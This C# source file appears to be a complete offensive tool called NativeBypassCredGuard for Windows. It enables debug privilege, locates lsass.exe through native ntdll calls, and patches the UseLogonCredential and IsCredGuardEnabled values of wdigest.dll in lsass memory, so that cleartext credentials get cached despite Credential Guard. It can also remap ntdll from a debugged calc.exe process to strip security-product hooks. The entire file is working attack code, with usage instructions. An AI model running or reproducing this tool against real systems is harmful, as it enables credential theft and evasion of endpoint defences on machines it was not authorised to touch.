using System;
using System.Text;
using System.Runtime.InteropServices;
using static NativeBypassCredGuard.NT;


namespace NativeBypassCredGuard
{
    internal class Program
    {
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public const uint TOKEN_QUERY = 0x00000008;
        public const uint FILE_OPEN = 0x00000001;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
        public const uint FILE_READ_DATA = 0x1;
        public const uint FILE_READ_ATTRIBUTES = 0x8;


        [StructLayout(LayoutKind.Sequential)] public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)] public struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Explicit)] public struct LARGE_INTEGER { [FieldOffset(0)] public long QuadPart; }

        [StructLayout(LayoutKind.Sequential)] public struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }

        [StructLayout(LayoutKind.Sequential)] public struct OBJECT_ATTRIBUTES { public int Length; public IntPtr RootDirectory; public IntPtr ObjectName; public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }

        [StructLayout(LayoutKind.Sequential)] public struct IO_STATUS_BLOCK { public IntPtr Status; public ulong Information; }

        [DllImport("ntdll.dll")] public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("ntdll.dll")] public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("ntdll.dll")] public static extern uint NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint dwSize, out uint lpNumberOfBytesRead);

        [DllImport("ntdll.dll")] public static extern uint NtGetNextProcess(IntPtr handle, int MAX_ALLOWED, int param3, int param4, out IntPtr outHandle);

        [DllImport("ntdll.dll")] public static extern uint NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr pbi, uint processInformationLength, out uint returnLength);

        [DllImport("ntdll.dll")] public static extern uint NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, ref uint buffer, uint bufferSize, out uint bytesWritten);

        [DllImport("ntdll.dll")] public static extern uint NtReadFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, ref LARGE_INTEGER ByteOffset, IntPtr Key);

        [DllImport("ntdll.dll")] public static extern uint NtClose(IntPtr hObject);

        [DllImport("ntdll.dll")] public static extern uint NtCreateFile(out IntPtr FileHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, out IO_STATUS_BLOCK IoStatusBlock, IntPtr AllocationSize, uint FileAttributes, uint ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength);


        static bool EnableDebugPrivileges(IntPtr currentProcess)
        {
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                    return false;
                }
                else
                {
                    return true;
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static bool ParsePEFile(byte[] buffer, out int offset, out int useLogonCredential, out int isCredGuardEnabled, out byte[] matchedBytes)
        {
            offset = 0;
            useLogonCredential = 0;
            isCredGuardEnabled = 0;
            matchedBytes = new byte[18];

            // PE header location
            int peHeaderOffset = BitConverter.ToInt32(buffer, 0x3C);
            uint peSignature = BitConverter.ToUInt32(buffer, peHeaderOffset);
            if (peSignature != 0x00004550)
            {
                Console.WriteLine("Not a valid PE file.");
                return false;
            }

            int numberOfSections = BitConverter.ToUInt16(buffer, peHeaderOffset + 6);
            int sizeOfOptionalHeader = BitConverter.ToUInt16(buffer, peHeaderOffset + 20);
            int sectionHeadersOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;
            for (int i = 0; i < numberOfSections; i++)
            {
                int sectionOffset = sectionHeadersOffset + (i * 40);
                string sectionName = Encoding.ASCII.GetString(buffer, sectionOffset, 8).TrimEnd('\0');
                if (sectionName == ".text")
                {
                    uint virtualAddress = BitConverter.ToUInt32(buffer, sectionOffset + 12);
                    uint rawDataPointer = BitConverter.ToUInt32(buffer, sectionOffset + 20);
                    uint rawDataSize = BitConverter.ToUInt32(buffer, sectionOffset + 16);

                    // Search for pattern
                    for (int j = (int)rawDataPointer; j < rawDataPointer + rawDataSize - 11; j++)
                    {
                        if (buffer[j] == 0x39 && buffer[j + 5] == 0x00 && buffer[j + 6] == 0x8b && buffer[j + 11] == 0x00)
                        {
                            offset = j + (int)virtualAddress - (int)rawDataPointer;
                            int count = 0;
                            for (int k = j; k < j + 18 && k < buffer.Length; k++)
                            {
                                matchedBytes[count] = buffer[k];
                                count++;
                            }

                            // Extract values
                            if (j + 5 < buffer.Length)
                            {
                                useLogonCredential = (buffer[j + 4] << 16) | (buffer[j + 3] << 8) | buffer[j + 2];
                                isCredGuardEnabled = (buffer[j + 10] << 16) | (buffer[j + 9] << 8) | buffer[j + 8];
                            }
                            return true;
                        }
                    }
                    Console.WriteLine("Pattern not found.");
                }
            }
            return false;
        }


        static bool ReadValues(IntPtr processHandle, IntPtr address, out byte[] buffer)
        {
            buffer = new byte[4];
            uint bytesReadProcess;
            if (NtReadVirtualMemory(processHandle, address, buffer, (uint)buffer.Length, out bytesReadProcess) == 0)
            {
                if (bytesReadProcess == 4)
                {
                    return true;
                }
            }
            return false;
        }


        static bool OpenFile(string filePath, out IntPtr fileHandle)
        {
            // Initialize UNICODE_STRING
            UNICODE_STRING unicodeString = new UNICODE_STRING();
            unicodeString.Length = (ushort)(filePath.Length * 2);
            unicodeString.MaximumLength = (ushort)((filePath.Length + 1) * 2);
            unicodeString.Buffer = Marshal.StringToHGlobalUni(filePath);

            // Set up OBJECT_ATTRIBUTES
            OBJECT_ATTRIBUTES objectAttributes = new OBJECT_ATTRIBUTES();
            objectAttributes.Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>();
            objectAttributes.RootDirectory = IntPtr.Zero;
            objectAttributes.ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf<UNICODE_STRING>());
            Marshal.StructureToPtr(unicodeString, objectAttributes.ObjectName, false);
            objectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
            objectAttributes.SecurityDescriptor = IntPtr.Zero;
            objectAttributes.SecurityQualityOfService = IntPtr.Zero;

            // IntPtr fileHandle;
            uint status = NtCreateFile(
               out fileHandle,
               FILE_READ_DATA  | FILE_READ_ATTRIBUTES,// 0x0009, //0x00120089,
               ref objectAttributes,
               out _,
               IntPtr.Zero,
               0,
               FILE_SHARE_READ,
               FILE_OPEN,
               0,
               IntPtr.Zero,
               0);

            if (status != 0)
            {
                throw new Exception($"Failed to open file handle. NTSTATUS: 0x{status.ToString("X")}");
            }

            return true;
        }


        static byte[] ReadDLL(IntPtr fileHandle)
        {
            byte[] fileBytes = new byte[1024 * 1024];
            IO_STATUS_BLOCK ioStatusBlock = new IO_STATUS_BLOCK();
            LARGE_INTEGER byteOffset = new LARGE_INTEGER { QuadPart = 0 };

            uint status = NtReadFile(
                    fileHandle,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref ioStatusBlock,
                    fileBytes,
                    (uint)fileBytes.Length,
                    ref byteOffset, //IntPtr.Zero,
                    IntPtr.Zero
                );

            // 0x103 is Status Pending, it seems it works ok :S
            if (status != 0 && status != 0x103)
            {
                throw new Exception($"Failed to read file. NTSTATUS: 0x{status.ToString("X")}");
            }

            return fileBytes;
        }


        public static bool SetValue(IntPtr processHandle, IntPtr address, uint value)
        {
            uint bytesWritten;
            uint ntstatus = NtWriteVirtualMemory(
                processHandle,
                address,
                ref value,
                sizeof(uint),
                out bytesWritten
            );

            if (ntstatus != 0 || bytesWritten != sizeof(uint))
            {
                throw new InvalidOperationException($"Failed to write memory. Error code: {Marshal.GetLastWin32Error()}");
            }

            return true;
        }


        public static IntPtr ReadRemoteIntPtr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[8];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, (uint)buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteIntPtr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            long value = BitConverter.ToInt64(buff, 0);
            return (IntPtr)value;
        }


        public static string ReadRemoteWStr(IntPtr hProcess, IntPtr mem_address)
        {
            byte[] buff = new byte[256];
            uint ntstatus = NtReadVirtualMemory(hProcess, mem_address, buff, (uint)buff.Length, out _);
            if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hProcess != IntPtr.Zero)
            {
                Console.WriteLine("[-] Error calling NtReadVirtualMemory (ReadRemoteWStr). NTSTATUS: 0x" + ntstatus.ToString("X") + " reading address 0x" + mem_address.ToString("X"));
            }
            string unicode_str = "";
            for (int i = 0; i < buff.Length - 1; i += 2)
            {
                if (buff[i] == 0 && buff[i + 1] == 0) { break; }
                unicode_str += BitConverter.ToChar(buff, i);
            }
            return unicode_str;
        }


        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name)
        {
            // If 32-bit process these offsets change
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int ldr_offset = 0x18;
            int inInitializationOrderModuleList_offset = 0x30;
            int flink_dllbase_offset = 0x20;
            int flink_buffer_offset = 0x50;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(hProcess, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
                // Console.WriteLine("[+] PEB Address: \t\t0x" + pbi_addr.ToString("X"));
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get Ldr 
            IntPtr ldr_pointer = pebaddress + ldr_offset;
            IntPtr ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
            if (ldr_adress == IntPtr.Zero)
            {
                Console.WriteLine("[-] PEB structure is not readable.");
                Environment.Exit(0);
            }

            IntPtr InInitializationOrderModuleList = ldr_adress + inInitializationOrderModuleList_offset;
            // Console.WriteLine("[+] InInitializationOrderModuleList:\t\t0x" + InInitializationOrderModuleList.ToString("X"));
            IntPtr next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);

            IntPtr dll_base = (IntPtr)1337;
            while (dll_base != IntPtr.Zero)
            {
                next_flink = next_flink - 0x10;
                // Get DLL base address
                dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
                IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));

                string base_dll_name = ReadRemoteWStr(hProcess, buffer);

                next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));

                // Compare with DLL name we are searching
                if (dll_name.ToLower() == base_dll_name.ToLower())
                {
                    return dll_base;
                }
            }
            return IntPtr.Zero;
        }


        unsafe static string GetProcNameFromHandle(IntPtr process_handle)
        {
            uint process_basic_information_size = 48;
            int peb_offset = 0x8;
            int commandline_offset = 0x68;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + peb_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);

            // Get PEB->ProcessParameters
            int processparameters_offset = 0x20;
            IntPtr processparameters_pointer = pebaddress + processparameters_offset;

            // Get ProcessParameters->CommandLine
            IntPtr processparameters_adress = ReadRemoteIntPtr(process_handle, processparameters_pointer);
            IntPtr commandline_pointer = processparameters_adress + commandline_offset;
            IntPtr commandline_address = ReadRemoteIntPtr(process_handle, commandline_pointer);
            string commandline_value = ReadRemoteWStr(process_handle, commandline_address);
            return commandline_value;
        }


        public static IntPtr GetProcessByName(string proc_name)
        {
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;

            while (NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle) == 0)
            {
                string current_proc_name = GetProcNameFromHandle(aux_handle).ToLower();
                if (current_proc_name == proc_name)
                {
                    return aux_handle;
                }
            }
            return IntPtr.Zero;
        }


        static void exec(string option, bool debug)
        {
            string dllName = "wdigest.dll";
            string filePath = @"\??\C:\Windows\System32\" + dllName;
            string proc_name = "c:\\windows\\system32\\lsass.exe";
            IntPtr fileHandle = IntPtr.Zero;

            try
            {
                // NtOpenProcessToken + NtAdjustPrivilegesToken -> Enable SeDebugPrivilege privilege
                IntPtr currentProcess = (IntPtr)(-1);
                bool privilege_bool = EnableDebugPrivileges(currentProcess);
                if (privilege_bool && debug)
                {
                    Console.WriteLine("[+] Enable SeDebugPrivilege: \tOK");
                }

                // NtCreateFile -> Get file handle
                bool openfile_bool = OpenFile(filePath, out fileHandle);
                if (openfile_bool && debug)
                {
                    Console.WriteLine($"[+] File Handle:\t\t{fileHandle}");
                }

                // NtReadFile -> Read DLL bytes
                byte[] fileBytes = ReadDLL(fileHandle);

                // Get offsets
                bool parse_bool = ParsePEFile(fileBytes, out int offset, out int useLogonCredential, out int isCredGuardEnabled, out byte[] matchedBytes);
                if (!parse_bool)
                {
                    return;
                }
                if (debug)
                {
                    Console.Write($"[+] Matched bytes:\t\t");
                    for (int l = 0; l < 18; l++)
                    {
                        Console.Write($"{matchedBytes[l]:X2} ");
                        if ((l + 1) % 6 == 0) { Console.Write(" "); }
                    }
                    Console.WriteLine();
                    Console.WriteLine($"[+] Offset:\t\t\t0x{offset:X}");
                    Console.WriteLine($"[+] UseLogonCredential offset:\t0x{(useLogonCredential + offset + 6):X6} (0x{useLogonCredential:X6} + Offset +  6)");
                    Console.WriteLine($"[+] IsCredGuardEnabled offset:\t0x{(isCredGuardEnabled + offset + 12):X6} (0x{isCredGuardEnabled:X6} + Offset + 12)");
                }

                // NtGetNextProcess + NtQueryInformationProcess -> Get lsass process handle 
                IntPtr lsassHandle = GetProcessByName(proc_name);
                if (lsassHandle == IntPtr.Zero)
                {
                    Console.WriteLine("[-] It was not possible to get lsass handle.");
                    return;
                }
                else {
                    if (debug) {
                        Console.WriteLine($"[+] Lsass Handle:\t\t{lsassHandle}");
                    }
                }

                // NtQueryInformationProcess -> wdigest.dll address in lsass
                IntPtr hModule = CustomGetModuleHandle(lsassHandle, dllName);
                IntPtr useLogonCredential_Address = hModule + (useLogonCredential + offset + 6);
                IntPtr isCredGuardEnabled_Address = hModule + (isCredGuardEnabled + offset + 12);
                if (debug)
                {
                    Console.WriteLine($"[+] DLL Base Address:\t\t0x{hModule.ToInt64():X}");
                    Console.WriteLine($"[+] UseLogonCredential address:\t0x{useLogonCredential_Address.ToInt64():X} (0x{hModule.ToInt64():X} + 0x{(useLogonCredential + offset + 6):X6})");
                    Console.WriteLine($"[+] IsCredGuardEnabled address:\t0x{isCredGuardEnabled_Address.ToInt64():X} (0x{hModule.ToInt64():X} + 0x{(isCredGuardEnabled + offset + 12):X6})");
                }

                if (option == "patch")
                {
                    // NtWriteProcessMemory -> Write values
                    uint useLogonCredential_Value = 1;
                    uint isCredGuardEnabled_Value = 0;
                    bool setval_bool = SetValue(lsassHandle, useLogonCredential_Address, useLogonCredential_Value);
                    if (debug && setval_bool)
                    {
                        Console.WriteLine($"[+] Wrote value {useLogonCredential_Value} to address: \t0x{useLogonCredential_Address.ToInt64():X} (useLogonCredential)");
                    }
                    setval_bool = SetValue(lsassHandle, isCredGuardEnabled_Address, isCredGuardEnabled_Value);
                    if (debug && setval_bool)
                    {
                        Console.WriteLine($"[+] Wrote value {isCredGuardEnabled_Value} to address: \t0x{isCredGuardEnabled_Address.ToInt64():X} (isCredGuardEnabled)");
                    }
                }

                // NtReadVirtualMemory -> Read values again
                bool readval_ulcr_bool = ReadValues(lsassHandle, useLogonCredential_Address, out byte[] useLogonCredential_buffer);
                bool readval_icge_bool = ReadValues(lsassHandle, isCredGuardEnabled_Address, out byte[] isCredGuardEnabled_buffer);
                if (debug && readval_ulcr_bool)
                {
                    Console.WriteLine($"[+] UseLogonCredential value: \t{useLogonCredential_buffer[0]:X2} {useLogonCredential_buffer[1]:X2} {useLogonCredential_buffer[2]:X2} {useLogonCredential_buffer[3]:X2}");
                }
                if (debug && readval_icge_bool)
                {
                    Console.WriteLine($"[+] IsCredGuardEnabled value: \t{isCredGuardEnabled_buffer[0]:X2} {isCredGuardEnabled_buffer[1]:X2} {isCredGuardEnabled_buffer[2]:X2} {isCredGuardEnabled_buffer[3]:X2}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            finally
            {
                if (fileHandle != IntPtr.Zero && fileHandle.ToInt64() != -1)
                {
                    NtClose(fileHandle);
                }
            }
        }


        static void RemapNtdll(bool debug)
        {
            if (debug)
            {
                Console.WriteLine($"[+] DLL remap:\t\t\tTrue");
            }

            // Create debugged process
            string process_path = "c:\\windows\\system32\\calc.exe";
            IntPtr unhookedNtdllTxt = GetNtdllFromDebugProc(process_path);

            // Local DLL info
            IntPtr currentProcess = (IntPtr)(-1);
            IntPtr localNtdllHandle = CustomGetModuleHandle(currentProcess, "ntdll.dll");
            int[] result = GetTextSectionInfo(localNtdllHandle);
            int localNtdllTxtBase = result[0];
            int localNtdllTxtSize = result[1];
            IntPtr localNtdllTxt = localNtdllHandle + localNtdllTxtBase;

            // Replace DLL
            if (debug)
            {
                Console.WriteLine("[+] DLL remap completed:\tCopied " + localNtdllTxtSize + " bytes from 0x" + unhookedNtdllTxt.ToString("X") + " to 0x" + localNtdllTxt.ToString("X"));
            }
            ReplaceNtdllTxtSection(unhookedNtdllTxt, localNtdllTxt, localNtdllTxtSize);
        }


        static void help()
        {
            Console.WriteLine("[+] Usage:\n    NativeBypassCredGuard.exe <OPTION> <REMAPNTDLL>\n\n    OPTION:\n        - 'check': Read current values.\n        - 'patch': Write new values.\n\n    REMAPNTDLL:\n        - true: Remap the ntdll library.\n        - false (or omitted): Do not remap the ntdll library.\n\n    Examples:\n        1. NativeBypassCredGuard.exe check\n           - Reads current values without remapping the ntdll library.\n        2. NativeBypassCredGuard.exe patch true\n           - Writes new values and remaps the ntdll library.");
        }


        static void Main(string[] args)
        {
            bool debug = true;
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] File must be compiled as 64-byte binary.");
                return;
            }

            if (args.Length == 0)
            {
                help();
                return;
            }

            if (debug)
            {
                Console.WriteLine($"[+] Debug messages:\t\t{debug}");
            }

            string firstArg = args[0].ToLower();
            switch (firstArg)
            {
                case "check":
                    if (args.Length == 2)
                    {
                        if (args[1].ToLower() == "true")
                        {
                            RemapNtdll(debug);
                        }
                    }
                    exec("check", debug);
                    break;

                case "patch":
                    if (args.Length == 2)
                    {
                        if (args[1].ToLower() == "true")
                        {
                            RemapNtdll(debug);
                        }
                    }
                    exec("patch", debug);
                    break;

                default:
                    help();
                    break;
            }
        }
    }
}